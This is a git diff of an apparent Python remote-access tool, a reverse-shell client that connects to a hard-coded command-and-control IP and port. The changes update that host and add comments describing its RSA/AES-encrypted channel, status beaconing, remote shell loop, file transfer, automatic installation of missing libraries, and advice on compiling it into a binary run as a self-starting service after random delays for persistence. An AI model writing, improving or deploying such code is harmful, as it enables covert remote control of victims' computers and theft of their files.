@@ -28,7 +28,7 @@ class colour:
     FG_CYAN     = "\033[36m"
     
     
-HOST = "192.168.0.104"
+HOST = "192.168.110.107"
 PORT = 6565
 test_PORT = 2121
 running =False
@@ -38,6 +38,8 @@ aes_key= b''
 ################                        Encrytion                        ##########################
 ###################################################################################################
 
+
+### first function take AES key from server and send with rsa, other 2 use key for encrypt and decrypt
 def key_generator(client):
     (publickey, privatekey) = rsa.newkeys(1024)
     client.send(publickey.save_pkcs1("PEM"))
@@ -65,7 +67,7 @@ def decrypt_data(encrypted_data):
 ################                      send/recv                          ##########################
 ###################################################################################################
 
-
+### As server, using for send and recv data with socket from same fucktion
 def resv(client):
     return decrypt_data(client.recv(409632)).decode()
  
@@ -77,9 +79,10 @@ def send(client,enc):
         client.send(encrypt_data(enc.encode()))
 
 ###################################################################################################
-################                     x                          ##########################
+################                           x                             ##########################
 ###################################################################################################
 
+### checkin status from server, if true or -1 connection run, if false wait again
 def check_status():
     try:
         hostname = socket.gethostname()
@@ -91,7 +94,7 @@ def check_status():
     except :
         pass
     
-
+### send default information at first connection
 def first_connect(client):
     try:
         send(client,socket.gethostname())
@@ -115,7 +118,7 @@ def first_connect(client):
 
 
 
-
+### revShell
 def connect(client):
     os_name = os.name
     while True:
@@ -155,7 +158,8 @@ def connect(client):
         else:
             send(client,"\n")
         time.sleep(0.3)
-    
+
+### file transfer, same as server
 def ftp(command,client):
     tip = command[1]
     file = command[2]
@@ -199,6 +203,7 @@ def ftp(command,client):
     else :
         return f"{colour.FG_RED}[*] Wrong command !!!\n{colour.END}"
     
+### starting of party
 def start_party():
     try:
         client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -228,6 +233,7 @@ def start_party():
 ################                     Copyright by Memo                   ##########################
 ###################################################################################################
 
+### check libraries, if not downloaded then download
 try:
     importlib.import_module("rsa")
 except:
@@ -244,7 +250,8 @@ except:
     os.system("pip install requests")
 ############################################
 
-
+### if you want to convert to binary file , delete while and then create service for run this binary.
+### It run each time by itself.
 while True:
     Timer = random.randit(20,200)
     time.sleep(Timer)
